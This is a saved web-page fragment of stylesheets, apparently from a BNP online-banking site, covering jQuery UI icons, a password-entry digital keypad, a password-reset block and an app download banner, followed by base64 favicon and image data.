.ui-state-disabled .ui-icon {
	filter:Alpha(Opacity=35); /* support: IE8 - See #6059 */
}

/* Icons
----------------------------------*/

/* states and images */
.ui-icon {
	width: 16px;
	height: 16px;
}
.ui-icon,
.ui-widget-content .ui-icon {
	background-image: /*savepage-url=images/ui-icons_222222_256x240.png*/ url();
}
.ui-widget-header .ui-icon {
	background-image: /*savepage-url=images/ui-icons_222222_256x240.png*/ url();
}
.ui-state-default .ui-icon {
	background-image: /*savepage-url=images/ui-icons_888888_256x240.png*/ url();
}
.ui-state-hover .ui-icon,
.ui-state-focus .ui-icon {
	background-image: /*savepage-url=images/ui-icons_454545_256x240.png*/ url();
}
.ui-state-active .ui-icon {
	background-image: /*savepage-url=images/ui-icons_454545_256x240.png*/ url();
}
.ui-state-highlight .ui-icon {
	background-image: /*savepage-url=images/ui-icons_2e83ff_256x240.png*/ url();
}
.ui-state-error .ui-icon,
.ui-state-error-text .ui-icon {
	background-image: /*savepage-url=images/ui-icons_cd0a0a_256x240.png*/ url();
}

/* positioning */
.ui-icon-blank { background-position: 16px 16px; }
.ui-icon-carat-1-n { background-position: 0 0; }
.ui-icon-carat-1-ne { background-position: -16px 0; }
.ui-icon-carat-1-e { background-position: -32px 0; }
.ui-icon-carat-1-se { background-position: -48px 0; }
.ui-icon-carat-1-s { background-position: -64px 0; }
.ui-icon-carat-1-sw { background-position: -80px 0; }
.ui-icon-carat-1-w { background-position: -96px 0; }
.ui-icon-carat-1-nw { background-position: -112px 0; }
.ui-icon-carat-2-n-s { background-position: -128px 0; }
.ui-icon-carat-2-e-w { background-position: -144px 0; }
.ui-icon-triangle-1-n { background-position: 0 -16px; }
.ui-icon-triangle-1-ne { background-position: -16px -16px; }
.ui-icon-triangle-1-e { background-position: -32px -16px; }
.ui-icon-triangle-1-se { background-position: -48px -16px; }
.ui-icon-triangle-1-s { background-position: -64px -16px; }
.ui-icon-triangle-1-sw { background-position: -80px -16px; }
.ui-icon-triangle-1-w { background-position: -96px -16px; }
.ui-icon-triangle-1-nw { background-position: -112px -16px; }
.ui-icon-triangle-2-n-s { background-position: -128px -16px; }
.ui-icon-triangle-2-e-w { background-position: -144px -16px; }
.ui-icon-arrow-1-n { background-position: 0 -32px; }
.ui-icon-arrow-1-ne { background-position: -16px -32px; }
.ui-icon-arrow-1-e { background-position: -32px -32px; }
.ui-icon-arrow-1-se { background-position: -48px -32px; }
.ui-icon-arrow-1-s { background-position: -64px -32px; }
.ui-icon-arrow-1-sw { background-position: -80px -32px; }
.ui-icon-arrow-1-w { background-position: -96px -32px; }
.ui-icon-arrow-1-nw { background-position: -112px -32px; }
.ui-icon-arrow-2-n-s { background-position: -128px -32px; }
.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }
.ui-icon-arrow-2-e-w { background-position: -160px -32px; }
.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }
.ui-icon-arrowstop-1-n { background-position: -192px -32px; }
.ui-icon-arrowstop-1-e { background-position: -208px -32px; }
.ui-icon-arrowstop-1-s { background-position: -224px -32px; }
.ui-icon-arrowstop-1-w { background-position: -240px -32px; }
.ui-icon-arrowthick-1-n { background-position: 0 -48px; }
.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }
.ui-icon-arrowthick-1-e { background-position: -32px -48px; }
.ui-icon-arrowthick-1-se { background-position: -48px -48px; }
.ui-icon-arrowthick-1-s { background-position: -64px -48px; }
.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }
.ui-icon-arrowthick-1-w { background-position: -96px -48px; }
.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }
.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }
.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }
.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }
.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }
.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }
.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }
.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }
.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }
.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }
.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }
.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }
.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }
.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }
.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }
.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }
.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }
.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }
.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }
.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }
.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }
.ui-icon-arrow-4 { background-position: 0 -80px; }
.ui-icon-arrow-4-diag { background-position: -16px -80px; }
.ui-icon-extlink { background-position: -32px -80px; }
.ui-icon-newwin { background-position: -48px -80px; }
.ui-icon-refresh { background-position: -64px -80px; }
.ui-icon-shuffle { background-position: -80px -80px; }
.ui-icon-transfer-e-w { background-position: -96px -80px; }
.ui-icon-transferthick-e-w { background-position: -112px -80px; }
.ui-icon-folder-collapsed { background-position: 0 -96px; }
.ui-icon-folder-open { background-position: -16px -96px; }
.ui-icon-document { background-position: -32px -96px; }
.ui-icon-document-b { background-position: -48px -96px; }
.ui-icon-note { background-position: -64px -96px; }
.ui-icon-mail-closed { background-position: -80px -96px; }
.ui-icon-mail-open { background-position: -96px -96px; }
.ui-icon-suitcase { background-position: -112px -96px; }
.ui-icon-comment { background-position: -128px -96px; }
.ui-icon-person { background-position: -144px -96px; }
.ui-icon-print { background-position: -160px -96px; }
.ui-icon-trash { background-position: -176px -96px; }
.ui-icon-locked { background-position: -192px -96px; }
.ui-icon-unlocked { background-position: -208px -96px; }
.ui-icon-bookmark { background-position: -224px -96px; }
.ui-icon-tag { background-position: -240px -96px; }
.ui-icon-home { background-position: 0 -112px; }
.ui-icon-flag { background-position: -16px -112px; }
.ui-icon-calendar { background-position: -32px -112px; }
.ui-icon-cart { background-position: -48px -112px; }
.ui-icon-pencil { background-position: -64px -112px; }
.ui-icon-clock { background-position: -80px -112px; }
.ui-icon-disk { background-position: -96px -112px; }
.ui-icon-calculator { background-position: -112px -112px; }
.ui-icon-zoomin { background-position: -128px -112px; }
.ui-icon-zoomout { background-position: -144px -112px; }
.ui-icon-search { background-position: -160px -112px; }
.ui-icon-wrench { background-position: -176px -112px; }
.ui-icon-gear { background-position: -192px -112px; }
.ui-icon-heart { background-position: -208px -112px; }
.ui-icon-star { background-position: -224px -112px; }
.ui-icon-link { background-position: -240px -112px; }
.ui-icon-cancel { background-position: 0 -128px; }
.ui-icon-plus { background-position: -16px -128px; }
.ui-icon-plusthick { background-position: -32px -128px; }
.ui-icon-minus { background-position: -48px -128px; }
.ui-icon-minusthick { background-position: -64px -128px; }
.ui-icon-close { background-position: -80px -128px; }
.ui-icon-closethick { background-position: -96px -128px; }
.ui-icon-key { background-position: -112px -128px; }
.ui-icon-lightbulb { background-position: -128px -128px; }
.ui-icon-scissors { background-position: -144px -128px; }
.ui-icon-clipboard { background-position: -160px -128px; }
.ui-icon-copy { background-position: -176px -128px; }
.ui-icon-contact { background-position: -192px -128px; }
.ui-icon-image { background-position: -208px -128px; }
.ui-icon-video { background-position: -224px -128px; }
.ui-icon-script { background-position: -240px -128px; }
.ui-icon-alert { background-position: 0 -144px; }
.ui-icon-info { background-position: -16px -144px; }
.ui-icon-notice { background-position: -32px -144px; }
.ui-icon-help { background-position: -48px -144px; }
.ui-icon-check { background-position: -64px -144px; }
.ui-icon-bullet { background-position: -80px -144px; }
.ui-icon-radio-on { background-position: -96px -144px; }
.ui-icon-radio-off { background-position: -112px -144px; }
.ui-icon-pin-w { background-position: -128px -144px; }
.ui-icon-pin-s { background-position: -144px -144px; }
.ui-icon-play { background-position: 0 -160px; }
.ui-icon-pause { background-position: -16px -160px; }
.ui-icon-seek-next { background-position: -32px -160px; }
.ui-icon-seek-prev { background-position: -48px -160px; }
.ui-icon-seek-end { background-position: -64px -160px; }
.ui-icon-seek-start { background-position: -80px -160px; }
/* ui-icon-seek-first is deprecated, use ui-icon-seek-start instead */
.ui-icon-seek-first { background-position: -80px -160px; }
.ui-icon-stop { background-position: -96px -160px; }
.ui-icon-eject { background-position: -112px -160px; }
.ui-icon-volume-off { background-position: -128px -160px; }
.ui-icon-volume-on { background-position: -144px -160px; }
.ui-icon-power { background-position: 0 -176px; }
.ui-icon-signal-diag { background-position: -16px -176px; }
.ui-icon-signal { background-position: -32px -176px; }
.ui-icon-battery-0 { background-position: -48px -176px; }
.ui-icon-battery-1 { background-position: -64px -176px; }
.ui-icon-battery-2 { background-position: -80px -176px; }
.ui-icon-battery-3 { background-position: -96px -176px; }
.ui-icon-circle-plus { background-position: 0 -192px; }
.ui-icon-circle-minus { background-position: -16px -192px; }
.ui-icon-circle-close { background-position: -32px -192px; }
.ui-icon-circle-triangle-e { background-position: -48px -192px; }
.ui-icon-circle-triangle-s { background-position: -64px -192px; }
.ui-icon-circle-triangle-w { background-position: -80px -192px; }
.ui-icon-circle-triangle-n { background-position: -96px -192px; }
.ui-icon-circle-arrow-e { background-position: -112px -192px; }
.ui-icon-circle-arrow-s { background-position: -128px -192px; }
.ui-icon-circle-arrow-w { background-position: -144px -192px; }
.ui-icon-circle-arrow-n { background-position: -160px -192px; }
.ui-icon-circle-zoomin { background-position: -176px -192px; }
.ui-icon-circle-zoomout { background-position: -192px -192px; }
.ui-icon-circle-check { background-position: -208px -192px; }
.ui-icon-circlesmall-plus { background-position: 0 -208px; }
.ui-icon-circlesmall-minus { background-position: -16px -208px; }
.ui-icon-circlesmall-close { background-position: -32px -208px; }
.ui-icon-squaresmall-plus { background-position: -48px -208px; }
.ui-icon-squaresmall-minus { background-position: -64px -208px; }
.ui-icon-squaresmall-close { background-position: -80px -208px; }
.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }
.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }
.ui-icon-grip-solid-vertical { background-position: -32px -224px; }
.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }
.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }
.ui-icon-grip-diagonal-se { background-position: -80px -224px; }


/* Misc visuals
----------------------------------*/

/* Corner radius */
.ui-corner-all,
.ui-corner-top,
.ui-corner-left,
.ui-corner-tl {
	border-top-left-radius: 4px;
}
.ui-corner-all,
.ui-corner-top,
.ui-corner-right,
.ui-corner-tr {
	border-top-right-radius: 4px;
}
.ui-corner-all,
.ui-corner-bottom,
.ui-corner-left,
.ui-corner-bl {
	border-bottom-left-radius: 4px;
}
.ui-corner-all,
.ui-corner-bottom,
.ui-corner-right,
.ui-corner-br {
	border-bottom-right-radius: 4px;
}

/* Overlays */
.ui-widget-overlay {
	background: #aaaaaa;
	opacity: .3;
	filter: Alpha(Opacity=30); /* support: IE8 */
}
.ui-widget-shadow {
	margin: -8px 0 0 -8px;
	padding: 8px;
	background: #aaaaaa;
	opacity: .3;
	filter: Alpha(Opacity=30); /* support: IE8 */
	border-radius: 8px;
}
.ui-dialog .ui-dialog-titlebar-close SPAN{
margin:0;
}
#bloc_reinit_mot_de_passe {
		font-size:12px;
	}</style>
	<style data-savepage-href="/tra_cosmos_css/style_mail_service_telematique.css" type="text/css">/*****************************************************/
/*** CSS  Simulateur de tarification fournisseur *****/
/*****************************************************/
	#bloc_service_telematique p, #bloc_reinit_mot_de_passe p {
		margin: 1.12em 0;	
	}	
	#bloc_service_telematique, #bloc_reinit_mot_de_passe {
		background-color:#DFEBF7;
		padding: 10px 30px;
		width:300px;
		font-size: 12px;
	}
	#bloc_service_telematique .my_label, #bloc_reinit_mot_de_passe .my_label {
		float:left;
		width:300px;
	}
	.ui-button-icon-primary .ui-icon .ui-icon-closethick {
		position:absolute;
		top:-10px;
		left:-20px;
	}
	.ui-widget-content .ui-state-hover,  .ui-state-focus{
		color : #365E8A;
	}
	#bp_serv_telematique_annuler #bp_serv_telematique_suivant{
		color:white;
	}</style>
	<style data-savepage-href="/tra_cosmos_css/digitalkeypad.css" type="text/css">/*
	Feuille de style pour le digital keypad
*/

.digitalKeypadInput {} /* utilis頳eulement pour appliquer les controles jquery ࠬ'input password */
.digitalKeypadClearInput {} /* sp飩fie le bouton qui supprime le contenu des zones de mdp */
.digitalKeypadSubmitter {} /* sp飩fie quel est le bouton qui valide le formulaire contenant le keypad */
.digitalKeypadIdentiquePassword {} /* utilis頰our sp飩fier que les input ayant cette class doivent avoir un mdp identique */


input[type="radio"].digitalKeypadRadio {width: auto;}
/*
.digitalKeypadInput.digitalKeypadVisible {background-color: #F5F5F5; vertical-align: middle;}
	.digitalKeypadInput.digitalKeypadVisible.borderred.selected {border-width: 2px; border-style: solid; border-color: #71A945;}
		
	.digitalKeypadInput.digitalKeypadVisible.error{border: 2px red solid; border-radius: 1px; background-color: #F3C2C2;}
	
.digitalKeypadInput.digitalKeypadHidden {display: none;}

	.digitalKeypadInput.digitalKeypadVisible.selected+.digitalKeypadClear,
	.digitalKeypadInput.digitalKeypadVisible:hover+.digitalKeypadClear,
	.digitalKeypadInput.digitalKeypadVisible+.digitalKeypadClear:hover{display: inline-block;}
*/

.digitalFakeInput {
	display: inline-block;
	cursor: not-allowed;
	width: 124px;
	height: 22px;
	line-height: 29px;
	border: 1px solid #d8d8d8;
	padding: 0px 3px;
	font-family: Arial;
	font-weight: bold;
	font-size: 20px;
	margin: 0;
	letter-spacing: 2px;
	text-align: left;
}

.digitalFakeInput {background-color: #F5F5F5; vertical-align: middle; }
	.digitalFakeInput.borderred.selected,
	.digitalFakeInput.bordered.selected {border-width: 2px; border-style: solid; border-color: #71A945;margin:-1px;}
		
	.digitalFakeInput.error, .digitalFakeInput.bordered.error {border: 2px red solid; border-radius: 1px; background-color: #F3C2C2; margin:-1px;}
	
.digitalKeypadHidden {display: none;}

	.digitalFakeInput.selected+.digitalKeypadClear,
	.digitalFakeInput:hover+.digitalKeypadClear,
	.digitalFakeInput+.digitalKeypadClear:hover{display: inline-block;}

.digitalKeypadClear {
    width: 18px;
    height: 14px;
    line-height: 18px;
	background: transparent /*savepage-url=/tra_cosmos_img/icone_croix.png*/ var(--savepage-url-14) 50% 0px no-repeat;
    margin: 0;
    left: -18px;
	margin-right: -18px;
    padding: 2px 0px;;
    vertical-align: middle;
    border: none;
	display: none;
	z-index: 1;
	position: relative;
}
	input.ll_inputProfile+.digitalKeypadClear {margin-left: -25px;} /* fix pour les input keypad dans le profil */
	.digitalKeypadClear:hover {
		color: #000000;
		cursor: pointer;
		background-position: 50% -14px;
	}

.digitalKeypadLabel{}
.digitalKeypadLabel input, .digitalKeypadLabel div {vertical-align: middle;}

.digitalKeypadRadio{
	margin: 0px -2px 0px -14px;
}

.digitalKeypad {
	width: 140px;
	margin-left: -2px;
}

.digitalKeypad  img{
	margin: 1px 2px;
	width: 30px;
	height: 30px;
}

.digitalKeypad  img:hover{
	margin: -1px 1px;
	border: 1px solid #019656;
	border-radius: 4px;
	cursor: pointer;
}

.digitalKeypad  img:active {
	border: 2px solid #0091DE;
	margin: -2px 0px;
}

/*
 * v2.1 avec champs mdp multiples par 鴡pes (animation)
 */
div#passwords-contenair { width: 300px; }

div#passwords-contenair.withSteps div.passwordStep { display: none; }

	div#passwords-contenair.withSteps.step1 div.passwordStep.step1 { display: block; }
	div#passwords-contenair.withSteps.step2 div.passwordStep.step2 { display: block; }
	div#passwords-contenair.withSteps.step3 div.passwordStep.step3 { display: block; }

div#passwords-contenair div.passwordStep {
	margin: 5px 0px;
	padding: 0;
	width: 300px;
	position: relative;
	vertival-align: top;
}
 
div#passwords-contenair div.passwordStep  label { vertical-align: middle; }
 
div#passwords-contenair div.passwordStep input[type=text],
div#passwords-contenair div.passwordStep input[type=password] {
	width: 128px;
	margin: 0;
	padding: 0;
}


div#passwords-contenair div.passwordStep div.input-contenair {
	float: right;
	position: relative;
	margin: 0;
	padding: 0;
	display: inline-block;
	width: 130px; /* 128px des inputs + 2*2px de border */
}
button.btn_fin {
	width:60px;
}

div.link_as_bouton a{
	font-weight:normal	
}
.bouton_gris {
	padding:7px;
}
input.ll_ident{
	width:128px;
}
.decalage_pave{
	padding-left:14px;
}

	td.decalage_pave > button.btnGris:first-child { margin-left:0px; }

#LANG_MODIFIER_MOTPASSE a{
	color:#0091DE;
	font-weight:bold;
}
#LANG_CODE_PRSC{
	white-space:nowrap;
}

/*
 *	Steps pour la version objet BNPDigitalKeypad
 */

.titre_step {
		font: 12px Arial,sans-serif;
		font-weight:normal;
		color:#586866;
}

.titre_step.selected{
	font-weight: bold;
}

	.digitalKeypad_step.selected .titre_step {
		font-weight: bold;
	}
	
	.digitalKeypad_step.selected  .digitalKeypad_step_holder>table{ }
		.digitalKeypad_step .digitalKeypad_step_holder>table { margin-top: 10px;}

	.digitalKeypad_step  .titre_step{
		background: /*savepage-url=/tra_cosmos_img/etape_nok.png*/ url() 100% 50% no-repeat;
	}
	
	.digitalKeypad_step.step_ok {
		cursor: pointer;
	}
	.digitalKeypad_step.step_ok .titre_step {
		background: /*savepage-url=/tra_cosmos_img/etape_ok.png*/ url() 100% 50% no-repeat;
	}
	
.cadre_pave.digitalKeypad_step { 
	padding: 5px;
	margin-bottom: 10px;
}

	/* masque le bouton 鴡pe pr飩dente si on est sur la 1貥 */
	.digitalKeypad_step.dkFirstStep .digitalKeypad_PrevStep { display: none; }
	.digitalKeypad_step.dkLastStep .digitalKeypad_NextStep { display: none; }
	
.lien_retour_modif_mdp{
	background-color: #A4A5A7;
	border: none;
	padding: 6px 9px;
	margin: 4px;
	max-width : 131px;
	text-align: center;
}

.lien_retour_modif_mdp a{
	color: #FFFFFF;
	text-transform: uppercase;
	font-size: 10px;
}

.lien_retour_modif_mdp a:hover {
	color: #1A5E84;
	text-decoration:none;
}
	
	
	
	
	
	</style>
<!-- FIN pave digital -->

<script data-savepage-type="" type="text/plain" language="JavaScript"></script>
<script data-savepage-type="" type="text/plain" language="JavaScript"></script>
<script data-savepage-type="" type="text/plain" language="JavaScript"></script>

<script data-savepage-type="" type="text/plain" language="JavaScript"></script>

<link type="image/ico" rel="icon" data-savepage-href="favicon.ico" href="data:text/plain;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAFnRFWHRDcmVhdGlvbiBUaW1lADA0LzMwLzA51O4BBwAAAAd0SU1FB9kKEwc4KaGbNYUAAAAJcEhZcwAACxEAAAsRAX9kX5EAAAAEZ0FNQQAAsY8L/GEFAAAAllBMVEWJzrZxwKR6xKgKlmQAgUIAiUwAeDUAhEkgn3AAjlgeonVYtpMAfUAAklsrpHcAjFIAbyiZ08Ci1cIZnG3///+GzrSi28gAejw8rYUYoHFHso6y28wMj1k1rIQAczBsv6KIyK3D6Nvn9vGw28xfu51IrodnupgSk2ASnGsxo3ef18Mupnx/xqqu2sgAbSQAmWaV0b1PtJA4NP20AAAAo0lEQVR42lWP2RLCIAwAU02AWGjUovVqve/7/3/OYlHHfWHY2TABnueyIZ6Qk0RshUQCht0bMY/EauavcPvU+xUFwSHGc3Lx/nq7gxEZb3ervVaH4nhSri4E63a9Ycas1EHo+WKplHADZCJl1f687BxklIv93WthJ9OZOEdRgsGBHxZajcYcC+n2+px7H5OwmEbspJbiSLv+EREqJP0GIGn98QJgzg7jQVzWSwAAAABJRU5ErkJggg=="><link rel="shurtcut icon" type="image/x-icon" data-savepage-href="favicon.ico" href=""><style data-savepage-href="/tra_cosmos_js/BNP/BNPCheckiOSAndroidApp.css">/*
 * CSS for Top Banner App MyView
 */
 
.appBanner {
	width: 100%;
	height: 80px;
	background-color: #f3f3f3;
	border-bottom: 3px solid #00965E;
	background: #f3f3f3; /* Old browsers */
	background: -moz-linear-gradient(top,  #ffffff 0%, #f3f3f3 41%, #f3f3f3 100%); /* FF3.6-15 */
	background: -webkit-linear-gradient(top,  #ffffff 0%,#f3f3f3 41%,#f3f3f3 100%); /* Chrome10-25,Safari5.1-6 */
	background: linear-gradient(to bottom,  #ffffff 0%,#f3f3f3 41%,#f3f3f3 100%); /* W3C, IE10+, FF16+, Chrome26+, Opera12+, Safari7+ */
	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#f3f3f3',GradientType=0 ); /* IE6-9 */
}

	.appBanner .appIcon {
		background: /*savepage-url=/tra_cosmos_img/appMyView.png*/ url() center no-repeat;
		background-size: 60px;
		width: 60px;
		height: 60px;
		display: inline-block;
		margin: 0px 15px;
		border-radius: 14px;
		box-shadow: 0px 0px 3px 1px rgba(0,0,0,0.2);
	}
	
	.appBanner .appInfo {
		display: inline-block;
	}
	
	.appBanner .appBannerBody {
		display: table;
		width: 960px;
		height: 100%;
		margin: 0 auto;
		display: inline-table;
		text-align: left;
	}
	
	.appBanner .appBannerBody  strong{
		font-size: 19px;
		letter-spacing: -1px;
		font-weight: normal;
	}
	
	.appBanner .appBannerBody  i {
		color: #9B9B9B;
		font-style: normal;
		font-size: 15px;
	}

	.appBanner .appBtnDownload {
		border: 1px solid #00965E;
		padding: 10px 15px;	
		border-radius: 2px;
		color: #00965E;
		text-transform: uppercase;
		text-decoration: none;
		float: right;
		margin-right: 15px;
		background-color: #F9F9F9;
		box-shadow: 1px 1px 0px rgb(47, 146, 80);
	}
	
	.appBanner .appBtnDownload:hover {
		color: #FFFFFF;
		background-color: #00965E;
	}</style>
<style id="savepage-cssvariables">
  :root {
    --savepage-url-10: url(data:image/jpeg;base64,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